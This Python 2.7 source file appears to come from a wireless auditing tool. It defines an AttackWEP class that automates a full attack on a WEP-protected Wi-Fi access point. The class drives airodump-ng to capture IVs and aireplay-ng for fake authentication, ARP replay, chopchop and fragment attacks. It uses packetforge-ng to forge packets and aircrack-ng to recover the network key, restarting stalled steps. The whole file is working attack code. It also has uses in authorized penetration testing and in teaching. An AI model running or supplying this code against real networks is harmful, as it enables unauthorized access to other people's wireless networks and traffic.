#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from Attack import Attack
from Airodump import Airodump
from Aireplay import Aireplay, WEPAttackType
from Aircrack import Aircrack
from Configuration import Configuration
from Interface import Interface
from Color import Color
from CrackResultWEP import CrackResultWEP

import time

class AttackWEP(Attack):
    '''
        Contains logic for attacking a WEP-encrypted access point.
    '''

    fakeauth_wait = 5

    def __init__(self, target):
        super(AttackWEP, self).__init__(target)
        self.crack_result = None
        self.success = False

    def run(self):
        '''
            Initiates full WEP attack.
            Including airodump-ng starting, cracking, etc.
            Returns: True if attack is succesful, false otherwise
        '''

        aircrack = None # Aircrack process, not started yet

        for (attack_index, attack_name) in enumerate(Configuration.wep_attacks):
            # BIG try-catch to capture ctrl+c
            try:
                # Start Airodump process
                with Airodump(channel=self.target.channel,
                              target_bssid=self.target.bssid,
                              ivs_only=True, # Only capture IVs packets
                              skip_wash=True, # Don't check for WPS-compatibility
                              output_file_prefix='wep') as airodump:

                    Color.clear_line()
                    Color.p('\r{+} {O}waiting{W} for target to appear...')
                    airodump_target = self.wait_for_target(airodump)

                    if self.fake_auth():
                        # We successfully authenticated!
                        # Use our interface's MAC address for the attacks.
                        client_mac = Interface.get_mac()
                    elif len(airodump_target.clients) == 0:
                        # There are no associated clients. Warn user.
                        Color.pl('{!} {O}there are no associated clients{W}')
                        Color.pl('{!} {R}WARNING: {O}many attacks will not succeed' +
                                 ' without fake-authentication or associated clients{W}')
                        client_mac = None
                    else:
                        client_mac = airodump_target.clients[0].station

                    # Convert to WEPAttackType.
                    wep_attack_type = WEPAttackType(attack_name)

                    replay_file = None
                    # Start Aireplay process.
                    aireplay = Aireplay(self.target, \
                                        wep_attack_type, \
                                        client_mac=client_mac, \
                                        replay_file=replay_file)

                    time_unchanged_ivs = time.time() # Timestamp when IVs last changed
                    previous_ivs = 0

                    # Loop until attack completes.

                    while True:
                        airodump_target = self.wait_for_target(airodump)
                        Color.p('\r{+} running {C}%s{W} WEP attack ({G}%d IVs{W}) '
                            % (attack_name, airodump_target.ivs))

                        # Check if we cracked it.
                        if aircrack and aircrack.is_cracked():
                            (hex_key, ascii_key) = aircrack.get_key_hex_ascii()
                            bssid = airodump_target.bssid
                            if airodump_target.essid_known:
                                essid = airodump_target.essid
                            else:
                                essid = None
                            Color.pl('\n{+} {C}%s{W} WEP attack {G}successful{W}\n'
                                % attack_name)
                            if aireplay:
                                aireplay.stop()
                            self.crack_result = CrackResultWEP(bssid, \
                                                               essid, \
                                                               hex_key, \
                                                               ascii_key)
                            self.crack_result.dump()
                            self.success = True
                            return self.success

                        if aircrack and aircrack.is_running():
                            # Aircrack is running in the background.
                            Color.p('and {C}cracking{W}')

                        # Check number of IVs, crack if necessary
                        if airodump_target.ivs > Configuration.wep_crack_at_ivs:
                            if not aircrack:
                                # Aircrack hasn't started yet. Start it.
                                ivs_file = airodump.find_files(endswith='.ivs')[0]
                                aircrack = Aircrack(ivs_file)

                            elif not aircrack.is_running():
                                # Aircrack stopped running.
                                Color.pl('\n{!} {O}aircrack stopped running!{W}')
                                ivs_file = airodump.find_files(endswith='.ivs')[0]
                                Color.pl('{+} {C}aircrack{W} stopped,' +
                                         ' restarting {C}aircrack{W}')
                                aircrack = Aircrack(ivs_file)

                            elif aircrack.is_running() and \
                                 Configuration.wep_restart_aircrack > 0:
                                # Restart aircrack after X seconds
                                if aircrack.pid.running_time() > Configuration.wep_restart_aircrack:
                                    aircrack.stop()
                                    ivs_file = airodump.find_files(endswith='.ivs')[0]
                                    Color.pl('\n{+} {C}aircrack{W} ran for more than' +
                                             ' {C}%d{W} seconds, restarting'
                                                 % Configuration.wep_restart_aircrack)
                                    aircrack = Aircrack(ivs_file)


                        if not aireplay.is_running():
                            # Some Aireplay attacks loop infinitely
                            if attack_name == 'chopchop' or attack_name == 'fragment':
                                # We expect these to stop once a .xor is created,
                                #    or if the process failed.

                                replay_file = None

                                # Check for .xor file.
                                xor_file = Aireplay.get_xor()
                                if not xor_file:
                                    # If .xor is not there, the process failed.
                                    Color.pl('\n{!} {O}%s attack{R} did not generate' % attack_name +
                                             ' a .xor file{W}')
                                    # XXX: For debugging
                                    Color.pl('\noutput:\n')
                                    Color.pl(aireplay.get_output())
                                    Color.pl('')
                                    break

                                # If .xor exists, run packetforge-ng to create .cap
                                Color.pl('\n{+} {C}%s attack{W}' % attack_name +
                                        ' generated a {C}.xor file{W}, {G}forging...{W}')
                                forge_file = Aireplay.forge_packet(xor_file,
                                                                   airodump_target.bssid,
                                                                   client_mac)
                                if forge_file:
                                    replay_file = forge_file
                                    Color.pl('{+} {C}forged packet{W},' +
                                             ' {G}replaying...{W}')
                                    attack_name = 'forged arp replay'
                                    aireplay = Aireplay(self.target, \
                                                        'forgedreplay', \
                                                        client_mac=client_mac, \
                                                        replay_file=replay_file)
                                    continue
                                else:
                                    # Failed to forge packet. drop out
                                    break
                            else:
                                Color.pl('\n{!} {O}aireplay-ng exited unexpectedly{W}')
                                Color.pl('\naireplay.get_output():')
                                Color.pl(aireplay.get_output())
                                break # Continue to other attacks

                        # Check if IVs stopped flowing (same for > N seconds)
                        if airodump_target.ivs > previous_ivs:
                            time_unchanged_ivs = time.time()
                        elif Configuration.wep_restart_stale_ivs > 0 and \
                             attack_name != 'chopchop' and \
                             attack_name != 'fragment':
                            stale_seconds = time.time() - time_unchanged_ivs
                            if stale_seconds > Configuration.wep_restart_stale_ivs:
                                # No new IVs within threshold, restart aireplay
                                aireplay.stop()
                                Color.pl('\n{!} restarting {C}aireplay{W} after' +
                                         ' {C}%d{W} seconds of no new IVs'
                                             % stale_seconds)
                                aireplay = Aireplay(self.target, \
                                                    wep_attack_type, \
                                                    client_mac=client_mac)
                                time_unchanged_ivs = time.time()
                        previous_ivs = airodump_target.ivs

                        time.sleep(1)
                        continue
                    # End of big while loop
                # End of with-airodump
            except KeyboardInterrupt:
                if not self.user_wants_to_continue(attack_index):
                    self.success = False
                    return self.success
            # End of big try-catch
        # End of for-each-attack-type loop

        self.success = False
        return self.success

    def user_wants_to_continue(self, attack_index):
        ''' Asks user if attacks should continue using remaining methods '''
        Color.pl('\n{!} {O}interrupted{W}\n')

        if attack_index + 1 >= len(Configuration.wep_attacks):
            # No more WEP attacks to perform.
            return False

        attacks_remaining = Configuration.wep_attacks[attack_index + 1:]
        Color.pl("{+} {G}%d{W} attacks remain ({C}%s{W})" % (len(attacks_remaining), ', '.join(attacks_remaining)))
        prompt = Color.s('{+} type {G}c{W} to {G}continue{W}' +
                         ' or {R}s{W} to {R}stop{W}: ')
        if raw_input(prompt).lower().startswith('s'):
            return False
        else:
            return True

    def fake_auth(self):
        '''
            Attempts to fake-authenticate with target.
            Returns: True if successful,
                     False is unsuccesful.
        '''
        Color.p('\r{+} attempting {G}fake-authentication{W} with {C}%s{W}...'
            % self.target.bssid)
        start_time = time.time()
        aireplay = Aireplay(self.target, 'fakeauth')
        process_failed = False
        while aireplay.is_running():
            if int(time.time() - start_time) > AttackWEP.fakeauth_wait:
                aireplay.stop()
                process_failed = True
                break
            time.sleep(0.1)

        # Check if fake-auth was successful
        if process_failed:
            fakeauth = False
        else:
            output = aireplay.get_output()
            fakeauth = 'association successful' in output.lower()

        if fakeauth:
            Color.pl(' {G}success{W}')
        else:
            Color.pl(' {R}failed{W}')
            if Configuration.require_fakeauth:
                # Fakeauth is requried, fail
                raise Exception(
                    'Fake-authenticate did not complete within' +
                    ' %d seconds' % AttackWEP.fakeauth_wait)
            else:
                # Warn that fakeauth failed
                Color.pl('{!} {O}' +
                    'unable to fake-authenticate with target' +
                    ' (%s){W}' % self.target.bssid)
                Color.pl('{!} continuing attacks because' +
                    ' {G}--require-fakeauth{W} was not set')
        return fakeauth



if __name__ == '__main__':
    from Target import Target
    fields = "A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, ".split(',')
    target = Target(fields)
    wep = AttackWEP(target)
    wep.run()

